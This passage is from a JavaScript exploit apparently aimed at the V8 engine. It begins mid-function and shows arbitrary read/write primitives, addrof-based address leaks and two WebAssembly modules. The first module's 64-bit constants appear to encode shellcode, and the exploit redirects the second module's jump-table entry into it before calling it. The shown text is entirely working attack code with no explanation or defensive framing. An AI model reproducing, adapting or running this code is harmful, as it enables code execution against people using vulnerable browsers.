    mem_access_array[1] = helper.i64tof64(((addr & 0xffffffffn) - 8n + 1n) | (0x0000001000000000n));
    fake_array2[0] = helper.i64tof64(value);
}

console.log(arb_read(addrof(fake_array) - 1n));

var wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x0c, 0x01, 0x60, 0x01, 0x7f, 0x07, 0x7e, 0x7e, 0x7e, 0x7e, 0x7e, 0x7e, 0x7e, 0x03, 0x02, 0x01, 0x00, 0x07, 0x05, 0x01, 0x01, 0x66, 0x00, 0x00, 0x0a, 0x4a, 0x01, 0x48, 0x00, 0x42, 0xb1, 0xec, 0xdb, 0x82, 0x89, 0x92, 0xe4, 0xf5, 0x02, 0x42, 0xbb, 0xdf, 0xbc, 0x99, 0x87, 0x8d, 0xe4, 0xf5, 0x02, 0x42, 0xc8, 0x82, 0x8f, 0x87, 0x92, 0xc6, 0xf4, 0xf5, 0x02, 0x42, 0xb8, 0xdf, 0x88, 0xcb, 0xe6, 0x8d, 0xe4, 0xf5, 0x02, 0x42, 0xc8, 0x92, 0x8c, 0x8e, 0xe3, 0xfe, 0xd4, 0xf5, 0x02, 0x42, 0xc8, 0x92, 0x9e, 0x8f, 0x83, 0x98, 0xe4, 0xf5, 0x02, 0x42, 0xb0, 0xf7, 0xbc, 0xa8, 0x80, 0x92, 0xe4, 0xf5, 0x02, 0x0b, 0x00, 0x0a, 0x04, 0x6e, 0x61, 0x6d, 0x65, 0x02, 0x03, 0x01, 0x00, 0x00
]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
console.log("[+] wasm_instance: " + helper.hex(addrof(wasm_instance)));
jump_table_start = addrof(wasm_instance) - 1n + 0x48n;
const { f } = wasm_instance.exports;
f();
origin_jump_target = arb_read(jump_table_start);
console.log("[+] origin_jump_target: " + helper.hex(origin_jump_target));

var wasm_code2 = new Uint8Array([
    0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11
]);
var wasm_mod2 = new WebAssembly.Module(wasm_code2);
var wasm_instance2 = new WebAssembly.Instance(wasm_mod2);
wasm_instance2_addr = addrof(wasm_instance2);
console.log("[+] wasm_instance2: " + helper.hex(wasm_instance2_addr));
jump_table_start2 = wasm_instance2_addr - 1n + 0x48n;
const f2 = wasm_instance2.exports.main;
arb_write(jump_table_start2, origin_jump_target + 0x81an);
f2();

